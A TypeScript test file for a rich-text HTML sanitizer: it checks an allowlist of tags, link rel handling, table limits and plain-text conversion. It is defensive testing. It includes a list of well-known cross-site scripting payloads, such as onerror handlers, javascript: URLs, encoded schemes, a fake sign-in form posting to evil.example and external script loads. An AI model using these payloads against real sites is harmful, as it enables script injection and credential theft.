// The rich-text cleaner (docs/rich-text-plan.md T4-T11, T17-T19), on its own.
//
// This is the file that decides whether a rich-text field is safe to show as
// HTML, so the tests are written the suspicious way round: every output is
// parsed again and checked against the allowlist, tag by tag and attribute by
// attribute, rather than looking for the one bad string we thought of.
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { Parser } from 'htmlparser2';
import {
  asRich, cleanRich, fromPlain, looksLikeHtml, MAX_COLUMNS, MAX_ROWS, plainOf, RichTextError,
} from '@panel/studio/studio/rich-text';

const ALLOWED: Record<string, string[]> = {
  p: [], br: [], h2: [], h3: [], h4: [], strong: [], em: [], u: [], s: [],
  ul: [], ol: ['start'], li: [], blockquote: [], hr: [], a: ['href', 'rel'],
  table: [], thead: [], tbody: [], tr: [], th: ['colspan', 'rowspan'], td: ['colspan', 'rowspan'],
};

// Everything in `html` is on the allowlist, and every link goes somewhere allowed.
function assertSafe(html: string | null, input: string) {
  if (html === null) return;
  const problems: string[] = [];
  const parser = new Parser({
    onopentag(name, attribs) {
      const ok = ALLOWED[name];
      if (!ok) { problems.push(`tag <${name}>`); return; }
      for (const [a, v] of Object.entries(attribs)) {
        if (!ok.includes(a)) problems.push(`<${name} ${a}>`);
        if (a === 'href') {
          const bare = v.replace(/[\u0000-\u0020\u007f-\u009f]/g, '').toLowerCase();
          if (/^[a-z][a-z0-9+.-]*:/.test(bare) && !/^(https?|mailto|tel):/.test(bare)) problems.push(`href ${v}`);
          if (bare.startsWith('//') || bare.startsWith('\\\\')) problems.push(`href ${v}`);
        }
      }
    },
  }, { decodeEntities: true, lowerCaseTags: true, lowerCaseAttributeNames: true });
  parser.write(html);
  parser.end();
  assert.deepEqual(problems, [], `from ${JSON.stringify(input)} came ${JSON.stringify(html)}`);
}

// A well-known spread of ways to get code into a page. Each must come out
// with nothing active left.
const ATTACKS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<embed src="javascript:alert(1)">',
  '<style>body{background:url(javascript:alert(1))}</style>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.example">x</a>',
  '<a href="\\\\evil.example">x</a>',
  '<a href="https://ok.example" onclick="alert(1)" target="_blank" rel="opener">x</a>',
  '<form action="https://evil.example"><input name="password"><button>Sign in</button></form>',
  '<input autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<body onload=alert(1)>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<!--<script>alert(1)</script>-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<textarea><script>alert(1)</script></textarea>',
  '<template><script>alert(1)</script></template>',
  '<p><div><script>alert(1)',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '"><script>alert(1)</script>',
  '<table background="javascript:alert(1)"><tr><td style="x" onclick="alert(1)">x</td></tr></table>',
  '<td colspan="1 onclick=alert(1)">x</td>',
  '<h2 id="x" class="y" data-x="z" onmouseover="alert(1)">x</h2>',
  '<ol start="1 onclick=alert(1)"><li>x</li></ol>',
  '<video><source onerror=alert(1)></video>',
  '<marquee onstart=alert(1)>x</marquee>',
];

describe('cleanRich: what may be in a rich-text field', () => {
  it('leaves nothing active in any of the known ways in', () => {
    for (const a of ATTACKS) {
      const out = cleanRich(a);
      assertSafe(out, a);
      if (out !== null) {
        assert.doesNotMatch(out, /alert\(1\)<\/|<script|onerror|onload|javascript:/i, `${a} -> ${out}`);
      }
    }
  });

  it('keeps the words of what it takes away', () => {
    assert.equal(cleanRich('<p><span style="color:red">red</span> and <font face="x">font</font></p>'), '<p>red and font</p>');
    assert.equal(cleanRich('<a href="javascript:alert(1)">the words</a>'), 'the words');
    assert.equal(cleanRich('<div><p>in a div</p></div>'), '<p>in a div</p>');
  });

  it('takes the contents of code and machinery too, not just the tag', () => {
    assert.equal(cleanRich('<p>a</p><script>var x = 1</script><style>p{}</style><p>b</p>'), '<p>a</p><p>b</p>');
    assert.equal(cleanRich('<p>a<svg><text>drawn</text></svg></p>'), '<p>a</p>');
  });

  it('keeps everything on the list unchanged', () => {
    const all = '<h2>A</h2><h3>B</h3><h4>C</h4><p><strong>b</strong> <em>i</em> <u>u</u> <s>s</s><br />next</p>'
      + '<ul><li>one</li></ul><ol start="3"><li>three</li></ol><blockquote><p>q</p></blockquote><hr />'
      + '<p><a href="https://example.org/x?y=1&amp;z=2" rel="noopener noreferrer nofollow">out</a> '
      + '<a href="/recipes.html" rel="noopener noreferrer">here</a> <a href="#method" rel="noopener noreferrer">there</a> '
      + '<a href="mailto:pamela@example.org" rel="noopener noreferrer">mail</a> <a href="tel:+441234" rel="noopener noreferrer">ring</a></p>'
      + '<table><thead><tr><th>h</th></tr></thead><tbody><tr><td colspan="2" rowspan="3">c</td></tr></tbody></table>';
    assert.equal(cleanRich(all), all);
  });

  it('writes other spellings the way the editor does', () => {
    assert.equal(cleanRich('<b>b</b><i>i</i><strike>s</strike><del>d</del>'), '<strong>b</strong><em>i</em><s>s</s><s>d</s>');
    assert.equal(cleanRich('<h1>one</h1><h5>five</h5><h6>six</h6>'), '<h2>one</h2><h4>five</h4><h4>six</h4>');
  });

  it('decides a link\'s rel itself, and never opens a new window', () => {
    assert.equal(cleanRich('<a href="https://x.example" rel="opener" target="_blank">x</a>'),
      '<a href="https://x.example" rel="noopener noreferrer nofollow">x</a>');
    assert.equal(cleanRich('<a href="page.html" rel="nofollow">x</a>'), '<a href="page.html" rel="noopener noreferrer">x</a>');
  });

  it('is empty when there is nothing to read (T10)', () => {
    for (const e of ['', '   ', '<p></p>', '<p><br></p>', '<p>&nbsp;</p>', '<p> </p><p></p>', '<script>x</script>', '<table><tr><td></td></tr></table>']) {
      assert.equal(cleanRich(e), null, JSON.stringify(e));
    }
    assert.equal(cleanRich('<hr>'), '<hr />');
  });

  it('gives the same answer when cleaning what it cleaned', () => {
    for (const a of [...ATTACKS, '<p>Hello <b>there</b></p><table><tr><td colspan="2"><h2>x</h2></td></tr></table>']) {
      const once = cleanRich(a);
      if (once !== null) assert.equal(cleanRich(once), once, a);
    }
  });

  it('reads broken HTML the way a parser does, and closes what it opened', () => {
    const out = cleanRich('<p><a href="https://x.example">unclosed <b>bold');
    assert.equal(out, '<p><a href="https://x.example" rel="noopener noreferrer nofollow">unclosed <strong>bold</strong></a></p>');
  });

  it('does not let a link it took away spoil the next one (sanitize-html closing-tag leak)', () => {
    const out = cleanRich('<a href="javascript:x">bad</a> <a href="https://ok.example">good</a> <b>after</b>');
    assert.equal(out, 'bad <a href="https://ok.example" rel="noopener noreferrer nofollow">good</a> <strong>after</strong>');
  });
});

describe('cleanRich: tables (T17-T19)', () => {
  it('keeps a table with a header row, and takes away widths and styles', () => {
    // what Tiptap writes: a colgroup and min-widths, all of it presentation
    const tiptap = '<table style="min-width: 50px"><colgroup><col style="min-width: 25px"><col style="min-width: 25px"></colgroup>'
      + '<tbody><tr><th colspan="1" rowspan="1"><p>Bed</p></th><th colspan="1" rowspan="1"><p>What</p></th></tr>'
      + '<tr><td colspan="1" rowspan="1" colwidth="120"><p>1</p></td><td colspan="1" rowspan="1"><p>Herbs</p></td></tr></tbody></table>';
    assert.equal(cleanRich(tiptap),
      '<table><tbody><tr><th><p>Bed</p></th><th><p>What</p></th></tr><tr><td><p>1</p></td><td><p>Herbs</p></td></tr></tbody></table>');
  });

  it('keeps a merged cell only as a whole number from 1 to 20', () => {
    assert.equal(cleanRich('<table><tr><td colspan="0">a</td><td colspan="99">b</td><td colspan="2x">c</td><td colspan="-1">d</td><td colspan="3">e</td></tr></table>'),
      '<table><tr><td>a</td><td>b</td><td>c</td><td>d</td><td colspan="3">e</td></tr></table>');
  });

  it('flattens a table inside a cell, and makes a heading there a paragraph', () => {
    const out = cleanRich('<table><tr><td><h2>Title</h2><table><tr><td>inner</td></tr></table><blockquote>q</blockquote><hr></td></tr></table>');
    assert.equal(out, '<table><tr><td><p>Title</p>innerq</td></tr></table>');
    assertSafe(out, 'nested');
  });

  it(`refuses more than ${MAX_COLUMNS} columns or ${MAX_ROWS} rows rather than cutting the table`, () => {
    assert.ok(cleanRich(`<table><tr>${'<td>x</td>'.repeat(MAX_COLUMNS)}</tr></table>`));
    assert.throws(() => cleanRich(`<table><tr>${'<td>x</td>'.repeat(MAX_COLUMNS + 1)}</tr></table>`), RichTextError);
    assert.throws(() => cleanRich(`<table><tr><td colspan="20">x</td><td colspan="11">y</td></tr></table>`), RichTextError);
    assert.ok(cleanRich(`<table>${'<tr><td>x</td></tr>'.repeat(MAX_ROWS)}</table>`));
    assert.throws(() => cleanRich(`<table>${'<tr><td>x</td></tr>'.repeat(MAX_ROWS + 1)}</table>`), /at most 30 columns and 500 rows/);
  });

  it('counts each table on its own', () => {
    const two = `<table>${'<tr><td>x</td></tr>'.repeat(300)}</table><table>${'<tr><td>x</td></tr>'.repeat(300)}</table>`;
    assert.ok(cleanRich(two));
  });
});

describe('rich text: writing from before, and the words alone', () => {
  it('tells writing from HTML (T11)', () => {
    assert.equal(looksLikeHtml('<p>x</p>'), true);
    assert.equal(looksLikeHtml('a<br>b'), true);
    assert.equal(looksLikeHtml('I <3 you'), false);
    assert.equal(looksLikeHtml('a < b and c > d'), false);
    assert.equal(looksLikeHtml('plain\n\nwriting'), false);
  });

  it('makes writing into paragraphs, word for word', () => {
    assert.equal(fromPlain('One\ntwo\n\nThree <b>not bold</b> & more'), '<p>One<br>two</p><p>Three &lt;b&gt;not bold&lt;/b&gt; &amp; more</p>');
    assert.equal(fromPlain('\r\n\r\nA\r\n\r\n\r\nB\n'), '<p>A</p><p>B</p>');
  });

  it('gives clean HTML for a stored value however it was written', () => {
    assert.equal(asRich(null), null);
    assert.equal(asRich(''), null);
    assert.equal(asRich('First\n\nSecond'), '<p>First</p><p>Second</p>');
    assert.equal(asRich('I <3 cake'), '<p>I &lt;3 cake</p>');
    assert.equal(asRich('<p>ok</p><script>x</script>'), '<p>ok</p>');
  });

  it('gives the words alone, with a space between blocks', () => {
    assert.equal(plainOf('<h2>Title</h2><p>one &amp; <b>two</b></p><ul><li>a</li><li>b</li></ul><script>x()</script>'), 'Title one & two a b');
    assert.equal(plainOf('<p>abcdefghij</p>', 5), 'abcde…');
    assert.equal(plainOf(''), '');
  });
});
